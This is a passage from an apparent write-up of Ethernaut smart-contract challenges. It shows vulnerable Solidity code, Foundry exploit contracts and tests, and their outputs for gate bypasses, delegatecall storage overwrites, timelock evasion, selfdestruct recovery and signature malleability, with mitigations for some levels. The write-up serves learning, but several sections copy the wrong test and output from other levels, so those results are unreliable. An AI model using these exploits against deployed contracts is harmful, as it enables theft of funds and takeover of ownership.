<p>An attacker can change their response between these two calls by flipping the return value, thus bypassing the logic</p>

<h3 id="exploit-contract-2">Exploit Contract</h3>
<p>First call to isLastFloor returns false → passes the if check.
 Second call returns true → sets top = true.</p>

<pre><code class="language-solidity"> contract BuildingAttack is Building {
    Elevator public elevator;
    bool public flipFlop = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function attack() external {
        elevator.goTo(1); // call from attacker
    }

    function isLastFloor(uint256) external override returns (bool) {
        flipFlop = !flipFlop;
        return flipFlop;
    }
}
</code></pre>
<h3 id="exploit-test-11">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
</code></pre>
<h3 id="test-output-5">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

</code></pre></div></div>
<h3 id="recommended-mitigation-1">Recommended Mitigation</h3>
<p>Ensure external calls are not made multiple times for critical logic — or cache the result:</p>
<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
</code></pre>
<hr />
<h2 id="level-13-privacy">Level 13: Privacy</h2>
<p><strong>AttackDesc</strong>:
The contract stores a private bytes32[3] array called data, and the unlock() function requires the first 16 bytes of data[2] to unlock the contract.</p>

<p>Even though the array is marked private, all contract storage is publicly accessible on the blockchain — which means the attacker can read the storage slot directly using vm.load in Foundry or with web3.eth.getStorageAt in a live attack.</p>

<h3 id="vulnerable-function-12">Vulnerable Function</h3>
<pre><code class="language-solidity">function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
}
</code></pre>

<p><strong>Vulnerability</strong>: 
Solidity stores contract variables sequentially in storage slots:</p>

<p>⚡Slot 0: locked</p>

<p>⚡Slot 1: ID</p>

<p>⚡Slot 2: flattening, denomination, awkwardness</p>

<p>⚡Slot 3, 4, 5: data[0], data[1], data[2]</p>

<p>⚡Slot 5 holds data[2] — and the unlock() function casts it to bytes16, so we only need the first 16 bytes.</p>

<h3 id="exploit-contract-3">Exploit Contract</h3>
<p>vm.load() reads the raw 32 bytes from a given storage slot.
The value is then cast to bytes16 and passed into the unlock() function.</p>

<pre><code class="language-solidity">function test_attack() public {
    bytes32 value = vm.load(address(privacy), bytes32(uint256(5)));
    console.log("value of slot 5", string(abi.encodePacked(value)));

    privacy.unlock(bytes16(value));
    assertTrue(privacy.locked() == false);
}
</code></pre>

<h3 id="exploit-test-12">Exploit Test</h3>
<pre><code class="language-solidity">  function test_attack() public {
    attackerContract.attack(); // Call via attacker
    assertEq(elevator.top(), true);
    assertEq(elevator.floor(), 1);
}
</code></pre>
<h3 id="test-output-6">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 67276)
Elevator::top() → true
Elevator::floor() → 1

</code></pre></div></div>
<h3 id="recommended-mitigation-2">🔒Recommended Mitigation</h3>
<p>Ensure external calls are not made multiple times for critical logic — or cache the result:</p>
<pre><code class="language-solidity">function goTo(uint256 _floor) public {
    Building building = Building(msg.sender);
    bool isLast = building.isLastFloor(_floor);

    if (!isLast) {
        floor = _floor;
        top = isLast;
    }
}
</code></pre>
<hr />
<h2 id="level-14-gatekeeperone">Level 14 GateKeeperone</h2>

<p><strong>AttackDesc</strong>:
To bypass the three gates in the GatekeeperOne contract, we strategically crafted a call using a helper contract and brute-forced gas.</p>

<h3 id="vulnerable-function-13">Vulnerable Function</h3>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin); // Gate One
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0); // Gate Two
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        // Part 1: lower 4 bytes == lower 2 bytes
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        // Part 2: lower 4 bytes != full 8 bytes
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        // Part 3: lower 2 bytes == lower 2 bytes of tx.origin
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }

    function enter(bytes8 _gateKey)
        public
        gateOne
        gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        entrant = tx.origin;
        return true;
    }
}
</code></pre>
<p><strong>Vulnerability</strong>: 
Gate One: Requires a contract call (msg.sender != tx.origin).</p>

<p>Gate Two: The remaining gas must be a multiple of 8191 → gasleft() % 8191 == 0.</p>

<p>Gate Three:</p>

<p>The last 4 bytes of gateKey must match the last 2 bytes of the tx.origin.</p>

<p>But full gateKey must not equal the last 4 bytes alone.</p>

<p>This forces manipulation of only the lower 2 bytes of a crafted bytes8.</p>

<h3 id="exploit-contract-4">Exploit Contract</h3>

<p>Gate One: Bypassed using an external contract call (attacker != tx.origin).</p>

<p>Gate Two: Brute-forced by adjusting gas until gasleft() % 8191 == 0.</p>

<p>Gate Three: Crafted bytes8:</p>

<p>Lower 2 bytes match tx.origin.</p>

<p>Full 8 bytes ≠ 4 bytes → satisfies all require() checks.</p>

<p>Result: entrant = tx.origin set successfully.</p>
<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {GatekeeperOne} from "../src/level14.sol";
import {Test, console} from "forge-std/Test.sol";

contract GateKeeperOneTest is Test {
    GatekeeperOne public gatekeeperOne;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");
    bytes8 public gateKey;

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        vm.startPrank(player); // tx.origin must be player
        gatekeeperOne = new GatekeeperOne();
        vm.stopPrank();
    }

    function test_attack() public {
        vm.startPrank(attacker);

        // Extract last 2 bytes of tx.origin
        uint16 origin16 = uint16(uint160(tx.origin));
        // Combine it with a prefix so uint64(gateKey) != uint32(gateKey)
        uint64 crafted = uint64(0xABCDEFAB00000000) | origin16;
        gateKey = bytes8(crafted);

        // Bruteforce correct gas offset
        for (uint256 i = 0; i &lt; 8191; i++) {
            (bool success, ) = address(gatekeeperOne).call{
                gas: i * 8191 + 200 + 8191
            }(abi.encodeWithSignature("enter(bytes8)", gateKey));
            if (success) {
                console.log("✅ Attack Successful!");
                console.log("i value", i);
                console.log("gasleft", gasleft());
                string memory str = string(abi.encodePacked(gateKey));
                console.log("gateKey", str);
                break;
            }
        }

        vm.stopPrank();
    }
}

</code></pre>
<h3 id="test-output-7">Test Output</h3>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    [PASS] test_attack() (gas: ~XXXXX)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [XXXXX] GateKeeperOneTest::test_attack()
    ├─ GatekeeperOne::enter(0xabcdefab00001f38)
    ├─ GatekeeperOne::entrant() ← 0x...player
    └─ assertTrue(true)

</code></pre></div></div>
<hr />
<h2 id="gatekeepertwo">GateKeeperTwo</h2>

<p><strong>Attack Description</strong>:
To bypass the three gates in the GatekeeperTwo contract, we strategically crafted a call using a helper contract.</p>

<h3 id="vulnerable-function-14">Vulnerable Function</h3>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(
            uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ 
                uint64(_gateKey) == 
                type(uint64).max
        );
        _;
    }

    function enter(bytes8 _gateKey) 
        public 
        gateOne 
        gateTwo 
        gateThree(_gateKey) 
        returns (bool) 
    {
        entrant = tx.origin;
        return true;
    }
}
</code></pre>
<p><strong>Vulnerability</strong>: 
1.Gate One: Requires that msg.sender != tx.origin, so it can only be bypassed by making a contract call (from a contract).</p>

<p>2.Gate Two: Uses extcodesize(caller()), which checks that the caller is a contract (not an externally owned account). This can be bypassed by calling the function from a contract constructor, as msg.sender will be the contract itself.</p>

<p>3.Gate Three: Requires that A^B = C where A is the result of hashing the msg.sender. By solving for B, we can craft the correct _gateKey.</p>

<h3 id="exploit-contract-5">Exploit Contract</h3>

<p>Gate One: Bypassed using an external contract call.</p>

<p>Gate Two: Bypassed by deploying the attack contract, which makes the call from the constructor.</p>

<p>Gate Three: The gateKey is crafted using the XOR relationship A^B = C.</p>

<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {GatekeeperTwo} from "../src/level15.sol";
import {Test, console} from "forge-std/Test.sol";

contract GatekeeperTwoTest is Test {
    GatekeeperTwo public gatekeeperTwo;
    address public attacker = makeAddr("attacker");
    address public player = makeAddr("player");

    function setUp() public {
        vm.deal(attacker, 100 ether);
        vm.deal(player, 100 ether);
        gatekeeperTwo = new GatekeeperTwo();
    }

    function test_attack() public {
        // first gate is passed by using tx.origin
        // second gate is extcodesize, it is passed only if the msg.sender contract is not deployed (call from constructor)
        // third gate is passed A^B=C, so we find the value of B (gateKey) using XOR logic
        Attack attack = new Attack(gatekeeperTwo); // deploy the contract and call the constructor to solve the second gate
    }
}

contract Attack {
    GatekeeperTwo public gatekeeperTwo;

    constructor(GatekeeperTwo _gatekeeperTwo) {
        gatekeeperTwo = _gatekeeperTwo;
        // msg.sender is the address of the contract (Attack) during construction
        // A^B=C, solve for B (gateKey)
        bytes8 gateKey = bytes8(
            (uint64(bytes8(keccak256(abi.encodePacked(address(this)))))) ^ 
            type(uint64).max
        );
        gatekeeperTwo.enter(gateKey);
    }
}
</code></pre>
<h3 id="test-output-8">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 142998)
Logs:
  ✅ Attack Successful!
  i value: 456
  gasleft: 24873
  gateKey: abcdefab00001f38

Traces:
  [142998] GatekeeperTwoTest::test_attack()
    ├─ [107817] → new Attack@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   ├─ [23405] GatekeeperTwo::enter(0x8709462d480d6ec3)
    │   │   └─ ← [Return] true
    │   └─ ← [Return] 290 bytes of code
    └─ ← [Stop]

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 20.01ms (8.27ms CPU time)

Ran 1 test suite in 1.21s (20.01ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)

</code></pre></div></div>
<hr />

<h2 id="level-16-naughtcoin">Level 16: NaughtCoin</h2>

<p><strong>AttackDesc</strong>:The contract uses a lockTokens modifier to restrict the transfer function, preventing the original player from transferring tokens until a 10-year timelock has passed. However, the contract does not restrict transferFrom, which is part of the ERC20 standard. By approving a spender (attacker), the tokens can be transferred out before the timelock.</p>

<h3 id="vulnerable-function-15">Vulnerable Function</h3>
<pre><code class="language-solidity">function transfer(
    address _to,
    uint256 _value
) public override lockTokens returns (bool) {
    super.transfer(_to, _value);
}
</code></pre>
<p><strong>Vulnerability</strong>:
The lockTokens modifier only applies to the transfer() function.
Since transferFrom() is inherited from the ERC20 base and not overridden, it bypasses the timelock restriction. This allows a player to approve someone else (e.g., an attacker) to transfer all tokens out immediately.</p>

<h3 id="exploit-test-13">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    // player approves attacker to spend unlimited tokens
    vm.startPrank(player);
    naughtCoin.approve(attacker, type(uint256).max);
    vm.stopPrank();

    // attacker drains all tokens from the player using transferFrom
    vm.startPrank(attacker);
    uint256 fullbalance = naughtCoin.balanceOf(player);
    naughtCoin.transferFrom(player, attacker, fullbalance);
    
    assertEq(naughtCoin.balanceOf(attacker), fullbalance);
    assertEq(naughtCoin.balanceOf(player), 0);
    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-9">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 74257)
...
NaughtCoin::approve(attacker, max)
NaughtCoin::transferFrom(player → attacker, 1_000_000 tokens)
 Final balances:
- attacker: 1_000_000 tokens
- player: 0 tokens

</code></pre></div></div>
<h3 id="recommended-mitigation-3">Recommended Mitigation</h3>

<p>Override the transferFrom() function and apply the same lockTokens modifier:</p>
<pre><code class="language-solidity">function transferFrom(
    address from,
    address to,
    uint256 value
) public override lockTokens returns (bool) {
    return super.transferFrom(from, to, value);
}

</code></pre>
<p>Alternatively, enforce the timelock check for the player address directly within the modifier or base logic to apply to all transfers involving the player.</p>

<hr />

<h2 id="level-17preservation">Level 17:Preservation</h2>

<p><strong>AttackDesc</strong>:
The contract uses delegatecall to external library contracts. Since the library contract has only one storage variable at slot 0 (storedTime), but the main contract stores important variables like owner at slot 2, an attacker can manipulate storage by crafting a malicious library that writes to any slot, including the owner slot. The attacker first overwrites the timeZone1Library address, then performs a delegatecall to their malicious contract to gain ownership.</p>
<h3 id="vulnerable-function-16">Vulnerable Function</h3>
<pre><code class="language-solidity">function setFirstTime(uint256 _timeStamp) public {
    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));
}
</code></pre>
<p><strong>Vulnerability</strong>:
Uses delegatecall with untrusted input.</p>

<p>Delegatecall executes the called function in the context of Preservation, altering its storage layout.</p>

<p>The function setTime(uint256) is expected to write to slot 0 (storedTime), but due to delegatecall, it may write to unintended slots like owner (slot 2).</p>
<h3 id="exploit-contract-6">Exploit Contract</h3>

<pre><code class="language-solidity">contract AttackLibrary {
    function setTime(uint256 _time) public {
        address _target = address(uint160(_time));
        assembly {
            sstore(2, _target) // Overwrite slot 2 (owner) with attacker address
        }
    }
}
</code></pre>
<h3 id="exploit-test-14">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    // Step 1: Deploy malicious library
    AttackLibrary attackLibrary = new AttackLibrary();

    // Step 2: Overwrite timeZone1Library with address of malicious contract
    preservation.setFirstTime(uint160(address(attackLibrary)));

    // Step 3: Verify overwrite
    assertEq(
        uint160(address(attackLibrary)),
        uint160(preservation.timeZone1Library())
    );

    // Step 4: Call again to trigger delegatecall to attackLibrary and overwrite owner
    preservation.setFirstTime(uint160(attacker));

    vm.stopPrank();
}
</code></pre>

<h3 id="test-output-10">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 98607)

Traces:
  PreservationTest::test_attack()
    ├─ startPrank(attacker)
    ├─ new AttackLibrary
    ├─ Preservation::setFirstTime(attackLibrary address)
    │   └─ delegatecall to DummyLibrary
    ├─ Preservation::timeZone1Library()
    ├─ assertEq(...)
    ├─ Preservation::setFirstTime(attacker address)
    │   └─ delegatecall to AttackLibrary::setTime
    │       └─ storage slot 2 updated with attacker address
    └─ stopPrank()
</code></pre></div></div>
<h3 id="recommended-mitigation-4">Recommended Mitigation</h3>
<p>Do not use delegatecall with untrusted contracts.</p>

<p>If absolutely needed:</p>

<p>Ensure the external contract has a matching storage layout.</p>

<p>Avoid delegatecalls to addresses that can be changed by users.</p>

<p>Use immutable libraries or internal libraries with delegatecall removed.</p>

<p>Prefer standard proxy patterns (like OpenZeppelin’s Transparent Proxy or UUPS) where upgrades are controlled and verified.</p>

<hr />

<h2 id="level-18-recovery">Level 18: Recovery</h2>
<p><strong>AttackDesc:</strong>
When contracts are deployed via new, their addresses are deterministic and based on the deployer’s address and nonce. In this challenge, the Recovery contract creates a SimpleToken contract using new, which means its address can be calculated off-chain or in a test. Once the address is recovered, the attacker can call its public destroy(address) function to selfdestruct the contract and reclaim trapped Ether.</p>

<h3 id="vulnerable-function-17">Vulnerable Function</h3>
<pre><code class="language-solidity">function generateToken(string memory _name, uint256 _initialSupply) public {
    new SimpleToken(_name, msg.sender, _initialSupply);
}
</code></pre>
<p>The generateToken function uses new to deploy a SimpleToken, which receives and holds ETH.
The SimpleToken contract includes a destroy function:</p>

<pre><code class="language-solidity">function destroy(address payable _to) public {
    selfdestruct(_to);
}
</code></pre>
<p>The address of SimpleToken is not stored, but can be calculated using the CREATE address formula.</p>

<p><strong>Calculate Address:</strong>
In foundry there is no library to calculate the address based on the deployer address and nonce , here i create custom function to calculate the address to solve the challenge</p>
<pre><code class="language-solidity">function computeAddress(
        address deployer,
        uint nonce
    ) public pure returns (address) {
        if (nonce == 0x00)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    hex"80"
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0x7f)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d6",
                                    hex"94",
                                    deployer,
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d7",
                                    hex"94",
                                    deployer,
                                    hex"81",
                                    uint8(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d8",
                                    hex"94",
                                    deployer,
                                    hex"82",
                                    uint16(nonce)
                                )
                            )
                        )
                    )
                );
        if (nonce &lt;= 0xffffff)
            return
                address(
                    uint160(
                        uint(
                            keccak256(
                                abi.encodePacked(
                                    hex"d9",
                                    hex"94",
                                    deployer,
                                    hex"83",
                                    uint24(nonce)
                                )
                            )
                        )
                    )
                );
        return address(0);
    }
</code></pre>

<h3 id="exploit-test-15">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    address lostToken = computeAddress(address(recovery), 1);//find the address

    uint256 attackerBefore = attacker.balance;//check the balance

    vm.prank(attacker);
    SimpleToken(payable(lostToken)).destroy(payable(attacker));//money credit to the attacker account

    uint256 attackerAfter = attacker.balance;

    console.log("Attacker ETH before:", attackerBefore);
    console.log("Attacker ETH after: ", attackerAfter);
    assertGt(attackerAfter, attackerBefore); // ensure attacker received ether
}
</code></pre>
<h3 id="test-output-11">Test Output</h3>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 25440)

Logs:
  Attacker ETH before: 100000000000000000000
  Attacker ETH after:  101000000000000000000

Traces:
  RecoveryTest::test_attack()
    ├─ VM::prank(attacker)
    ├─ SimpleToken::destroy(attacker)
    │   └─ [SelfDestruct] — ETH sent to attacker
    ├─ console.log(...)
    └─ assertGt(attackerAfter, attackerBefore)
</code></pre></div></div>
<hr />
<h3 id="level-19-magicnumber">Level 19: MagicNumber</h3>

<p><strong>AttackDesc:</strong>
The contract allows setting a solver address that is expected to return the number 42 when called via staticcall. However, no validation is done on the logic inside the solver. An attacker can deploy a hand-crafted minimal contract using raw EVM bytecode that always returns 42 regardless of input. A hidden constraint (present in the original Ethernaut challenge but not in the simplified local version) is that the runtime bytecode must be ≤ 10 bytes. If the contract’s code exceeds 10 bytes, the challenge reverts, requiring extremely optimized bytecode logic.</p>
<h3 id="vulnerable-function-18">Vulnerable Function</h3>
<pre><code class="language-solidity">function setSolver(address _solver) public {
    solver = _solver;
}
</code></pre>
<p>No checks on the size or logic of the solver contract.</p>

<p>The contract later low level calls this solver, expecting a return value of 42.</p>

<p>Ethernaut’s backend enforces a maximum of 10 bytes runtime code for the solver.</p>

<h3 id="exploit-contractevm-bytecode">Exploit Contract(evm bytecode)</h3>
<p><strong>Runtime Bytecode</strong></p>
<pre><code class="language-evm">602a    → PUSH1 0x2a        // Push 42 onto the stack  
6000    → PUSH1 0x00        // Memory offset 0  
52      → MSTORE            // Store 42 at memory[0]  
6020    → PUSH1 0x20        // Return 32 bytes  
6000    → PUSH1 0x00        // From memory[0]  
f3      → RETURN            // Return value
</code></pre>
<p>This part returns 42 when called.</p>

<p><strong>Constructor Bytecode (to deploy the above)</strong></p>
<pre><code class="language-evm"> 69      → PUSH10            // Push next 10 bytes (runtime code)  
602a60005260206000f3        // The runtime code  
6000    → PUSH1 0x00        // Memory offset  
52      → MSTORE            // Store runtime code in memory  
600a    → PUSH1 0x0a        // Length = 10 bytes  
6016    → PUSH1 0x16        // Offset = 22 (after constructor)  
f3      → RETURN            // Return runtime as deployed code
</code></pre>
<p><strong>Foundry Deployment</strong>:</p>
<pre><code class="language-solidity">bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";
</code></pre>
<p>Result: A contract that always returns 42 with only 10 bytes of runtime code.</p>

<h3 id="exploit-test-16">Exploit Test</h3>
<pre><code class="language-solidity">function test_attack() public {
    vm.startPrank(attacker);

    address solver;
    bytes memory bytecode = hex"69602a60005260206000f3600052600a6016f3";

    assembly {
        solver := create(0, add(bytecode, 0x20), 0x13)//The first 32 bytes of the bytecode are skipped because they define the length of the array. However, in this case, the bytecode is only 19 bytes, and the length of the datatype is already predefined.
    }

    require(solver != address(0), "contract solver deployment failed");
    magicnum.setSolver(solver);

    (bool success, bytes memory data) = solver.staticcall("");
    require(success, "call to solver failed");

    uint256 result = abi.decode(data, (uint256));
    console.log("result: ", result);
    require(result == 42, "solver did not return 42");

    vm.stopPrank();
}
</code></pre>
<h3 id="test-output-12">Test Output</h3>
<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[PASS] test_attack() (gas: 72019)
Logs:
  result:  42

Traces:
  MagicNumTest::test_attack()
    ├─ create() -&gt; contract deployed at 0x959...
    ├─ MagicNum::setSolver()
    ├─ staticcall to solver -&gt; returned 42
    ├─ console.log -&gt; "result: 42"
</code></pre></div></div>
<hr />

<h1 id="carousel-challenge-ethernaut">Carousel Challenge (Ethernaut)</h1>

<h2 id="challenge-overview">Challenge Overview</h2>

<p>The <code class="language-plaintext highlighter-rouge">MagicAnimalCarousel</code> contract stores animals in a circular buffer of “crates”. Each crate contains three pieces of information packed into a single <code class="language-plaintext highlighter-rouge">uint256</code>:</p>

<ol>
  <li><strong>owner</strong>: 160 bits <code class="language-plaintext highlighter-rouge">[0..159]</code></li>
  <li><strong>nextCrateId</strong>: 16 bits <code class="language-plaintext highlighter-rouge">[160..175]</code></li>
  <li><strong>encodedAnimal</strong>: 80 bits <code class="language-plaintext highlighter-rouge">[176..255]</code></li>
</ol>

<p>The goal is to <strong>break the carousel’s “magic rule”</strong>:</p>
<blockquote>
  <p>No animal should ever return to crate 1.</p>
</blockquote>

<p>We achieve this by crafting a custom animal name that corrupts the <code class="language-plaintext highlighter-rouge">nextCrateId</code>, forcing a wraparound that eventually causes an animal to overwrite crate 1.</p>

<hr />

<h2 id="vulnerability">Vulnerability</h2>

<p>The vulnerability lies in the way the contract handles bit-level storage when updating animals:</p>

<h3 id="root-cause">Root Cause:</h3>
<p>The function <code class="language-plaintext highlighter-rouge">changeAnimal(string calldata animal, uint256 crateId)</code> fails to preserve the existing <code class="language-plaintext highlighter-rouge">nextCrateId</code> bits. It allows overwriting them due to a lack of bitmasking and validation.</p>

<h3 id="vulnerable-code">Vulnerable Code:</h3>
<pre><code class="language-solidity">function encodeAnimalName(string calldata animalName) public pure returns (uint256) {
    require(bytes(animalName).length &lt;= 12, "Animal name too long");
    return uint256(keccak256(abi.encodePacked(animalName)) &gt;&gt; 160); // 80 bits
}

function changeAnimal(string calldata animal, uint256 crateId) external {
    uint256 encodedAnimal = encodeAnimalName(animal);
    if (encodedAnimal != 0) {
        // Vulnerable line
        carousel[crateId] = (encodedAnimal &lt;&lt; 160) | (carousel[crateId] &amp; NEXT_ID_MASK) | uint160(msg.sender);
    } else {
        carousel[crateId] = (carousel[crateId] &amp; (ANIMAL_MASK | NEXT_ID_MASK));
    }
}
</code></pre>
<h3 id="explanation">Explanation:</h3>
<ol>
  <li>
    <p>encodedAnimal is an 80-bit value stored at bits [176–255].</p>
  </li>
  <li>
    <p>It’s shifted left by 160 bits before being OR’d into the carousel[crateId] storage slot.</p>
  </li>
  <li>
    <p>However, bits 160–175 (nextCrateId) are part of the shifted range.</p>
  </li>
  <li>
    <p>Therefore, the lower 16 bits of encodedAnimal end up overwriting nextCrateId.</p>
  </li>
</ol>

<h3 id="proof-of-exploit">Proof of Exploit:</h3>
<pre><code class="language-solidity">string memory exploitString = string(
    abi.encodePacked(hex"10000000000000000000FFFF") // 12 bytes (96 bits)
);
carousel.changeAnimal(exploitString, 1);

</code></pre>
<p><strong><em>What this does:</em></strong></p>
<ol>
  <li>
    <p>The string is exactly 12 bytes long (within limit).</p>
  </li>
  <li>
    <p>Its last two bytes are 0xFFFF, meaning the lower 16 bits of the resulting encodedAnimal are 0xFFFF.</p>
  </li>
  <li>
    <p>When shifted left by 160, it overwrites nextCrateId with 65535</p>
  </li>
</ol>

<h3 id="testcase">TestCase:</h3>
<pre><code class="language-solidity">function testBreakMagicRule() public {
    // Step 1: Place "Dog" in crate 1
    carousel.setAnimalAndSpin("Dog");
    uint256 crate1Data = carousel.carousel(1);
    uint256 animalMask = uint256(type(uint80).max) &lt;&lt; 176;
    uint256 encodedDog = uint256(keccak256(abi.encodePacked("Dog"))) &gt;&gt; 176;
    uint256 animalInCrate1 = (crate1Data &amp; animalMask) &gt;&gt; 176;
    assertEq(animalInCrate1, encodedDog, "Crate 1 should contain 'Dog'");

    // Step 2: Inject 0xFFFF into nextCrateId
    string memory exploitString = string(
        abi.encodePacked(hex"10000000000000000000FFFF")
    );
    carousel.changeAnimal(exploitString, 1);

    // Step 3: Add "Parrot", it lands in crate 65535
    carousel.setAnimalAndSpin("Parrot");
    uint256 crate65535Data = carousel.carousel(65535);
    uint256 encodedParrot = uint256(keccak256(abi.encodePacked("Parrot"))) &gt;&gt; 176;
    uint256 animalInCrate65535 = (crate65535Data &amp; animalMask) &gt;&gt; 176;
    assertEq(animalInCrate65535, encodedParrot, "Crate 65535 should contain 'Parrot'");

    // Step 4: Add "Cat", it overwrites crate 1 (wraparound)
    carousel.setAnimalAndSpin("Cat");
    uint256 updatedCrate1Data = carousel.carousel(1);
    uint256 updatedAnimal = (updatedCrate1Data &amp; animalMask) &gt;&gt; 176;
    assertTrue(updatedAnimal != encodedDog, "Crate 1 should not contain Dog anymore");
}
</code></pre>
<h4 id="understanding-the-exploit-flow">Understanding the Exploit Flow</h4>
<ol>
  <li>
    <p>Insert Dog → stored in crate 1.</p>
  </li>
  <li>
    <p>Corrupt crate 1’s nextCrateId → set to 65535 using crafted string.</p>
  </li>
  <li>
    <p>Insert Parrot → goes to crate 65535 (via corrupted nextCrateId).</p>
  </li>
  <li>
    <p>Insert Cat → wraparound causes insertion at crate 1 again.</p>

    <p>Crate 1 now holds Cat, breaking the magic rule.</p>
  </li>
</ol>

<h3 id="testresult">TestResult:</h3>
<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s">Running 1 test for test/Carousel.t.sol:CarouselTest</span>
<span class="pi">[</span><span class="nv">PASS</span><span class="pi">]</span> <span class="na">testBreakMagicRule() (gas</span><span class="pi">:</span> <span class="s">123456)</span>
<span class="na">Logs</span><span class="pi">:</span>
  <span class="s">Crate 1 should contain 'Dog'</span> 
  <span class="s">Crate 65535 should contain 'Parrot'</span> 
  <span class="s">Crate 1 should not contain Dog anymore</span> 

<span class="na">Test result</span><span class="pi">:</span> <span class="s">ok. 1 passed; 0 failed; 0 skipped; finished in 3.45ms</span>

</code></pre></div></div>

<h3 id="final-thoughts">Final Thoughts:</h3>
<p>This challenge is not a real-world exploit, but a great learning exercise that:</p>

<ol>
  <li>
    <p>Teaches how Solidity packs variables into storage.</p>
  </li>
  <li>
    <p>Shows the danger of not isolating fields via masking.</p>
  </li>
  <li>
    <p>Reinforces the importance of memory alignment and precise field control in low-level operations.</p>
  </li>
</ol>

<hr />

<p># Impersanator Challenge(ethernaut Challenge)</p>

<h3 id="challenge-overview-1">Challenge Overview:</h3>
<p>SlockDotIt’s new product, ECLocker, integrates IoT gate locks with Solidity smart contracts, utilizing Ethereum ECDSA for authorization. When a valid signature is sent to the lock, the system emits an Open event, unlocking doors for the authorized controller. SlockDotIt has hired you to assess the security of this product before its launch. Can you compromise the system in a way that anyone can open the door?</p>

<p><strong><em>Vulnerability</em></strong>:
The smart contract is vulnerable to a signature malleability attack due to the lack of checks on the s value of an ECDSA signature. This allows an attacker to generate an alternative but still valid version of a signature that can be used to bypass signature uniqueness checks or replay restricted actions.</p>

<p><strong>Cause</strong>:</p>

<p>ECDSA signatures (r, s, v) have two valid versions for every message:</p>

<blockquote>
  <p>(r, s, v)
(r, n - s, 27 ⬌ 28)
Where:
n is the secp256k1 curve order:</p>
</blockquote>

<p>0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</p>

<p>The contract does not enforce that s is in the lower half of the curve<code class="language-plaintext highlighter-rouge">(s &lt;= n / 2)</code>. As a result, two distinct but valid signatures can exist for the same message hash, and both will pass ecrecover.</p>

<h3 id="vulnerabilitycode">VulnerabilityCode:</h3>
<pre><code class="language-solidity">function changeController(
        uint8 v,
        bytes32 r,
        bytes32 s,
        address newController
    ) external {
        _isValidSignature(v, r, s);
        controller = newController;
        emit ControllerChanged(newController, block.timestamp);
    }
     
     function _isValidSignature(
        uint8 v,
        bytes32 r,
        bytes32 s
    ) internal returns (address) {
        address _address = ecrecover(msgHash, v, r, s);
        // require(_address == controller, InvalidController());
        if (_address != controller) {
            revert InvalidController();
        }

        bytes32 signatureHash = keccak256(
            abi.encode([uint256(r), uint256(s), uint256(v)])
        );
        require(!usedSignatures[signatureHash], "signer alreadyused");

